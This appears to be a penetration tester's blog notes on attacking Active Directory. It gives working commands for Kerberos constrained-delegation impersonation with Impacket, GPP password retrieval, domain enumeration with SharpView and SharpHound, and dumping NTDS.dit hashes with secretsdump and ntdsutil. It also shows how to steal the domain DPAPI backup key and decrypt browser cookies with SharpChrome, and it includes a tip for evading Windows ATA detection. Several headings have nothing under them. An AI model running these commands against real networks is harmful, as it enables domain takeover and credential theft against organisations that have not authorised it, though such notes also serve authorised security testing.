---
date: 2020-04-09 23:00:00 +0000
title: Active Directory Enumeration and Exploitation
description: Notes on AD Enumeration and Exploitation
categories: ActiveDirectory

---
\### SharpView

SharpView has a number of useful functions that can be used to get information:

\`\`\`

\`\`\`

\#### Kerberos Exploitation

\### Unconstrained Delegation

\### Constrained Delegation

If a target computer has the "msDS-AllowedToDelegateTo" and includes an account which an attacker controls(either through ACLs or local administrator rights), then they can compromise the target computer through s4U2Self and S4U2Proxy. Additionally, if computer account NTLM credentials can be relayed to a DC over LDAP, then it is possible to use ntlmrelayx to modify the "msDS-AllowedToDelegateTo" propery in order to include a computer account under control of an attacker. This means that an attacker can then compromise this relayed computer.

An example of creating these types of impersonation tickets with Impacket is shown below:

\`\`\`

proxychains getST.py -dc-ip ip_address -spn cifs/DC01 'DOMAIN/WS01$' -hashes 'LM:NT' -impersonate domain_account

\`\`\`

\### Constrained Resoure Delegation

Uses "msDS-AllowedToActOnBehalfOfOtherIdentity" property on computer object. An attacker has "GenericWrite" over the target computer object, they can modify the "AllowedToAct" and include an SPN which they control.

\#### SPNs

\#### ASRepRoast

\### GPP Passwords

The following tool can be used to pull down the GPP preference file from a domain controller in order to retrieve the password, this does not rely on policy files being cached on the target host:

\`\`\`

execute-assembly Net-GPPPassword

\`\`\`

\### AD User Enumeration

\`\`\`

execute-assembly SharpView.exe Get-NetUser -Name username

\`\`\`

\`\`\`

execute-assembly SharpView.exe Get-NetUser -Properties manager,department,..

\`\`\`

\### SharpHound

SharpHound can be used to enumerate all collections from a domain, using the following command:

\`\`\`

execute-assembly ADEnum.exe -c All --zipFileName ad -Domain 

\`\`\`

To avoid querying the domain controllers in cases where Windows ATA is in use, use the -ExcludeDC command.

\### Dumping NTDS.dit

A number of ways can be used to dump the NTDS.dit database depending on the situation. If remote code execution is valid, then impacket modules such as secretdump through proxychains, however this process could be time consuming.

\`\`\`

proxychains secretdump.py -just-dc-ntlm domain/user@dc_ip

\`\`\`

Another approach is to use ntdsutil and copy the folder from the DC:

\`\`\`

ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntdsdump" q q

\`\`\`

\## Dumping DPAPI Backup Keys

.\\SharpChrome.exe backupkey /server:dc01 /file:key.pvk

\`\`\`

\[*\] Action: Retrieve domain DPAPI backup key

\[*\] Using server                     : dc01

\[*\] Preferred backupkey Guid         : \[guid\]

\[*\] Full preferred backupKeyName     : \[backupkeyname\]

\[*\] Backup key written to            : key.pvk

\`\`\`

\`\`\`

.\\SharpChrome.exe cookies /server:workstation /pvk:key.pvk

\`\`\`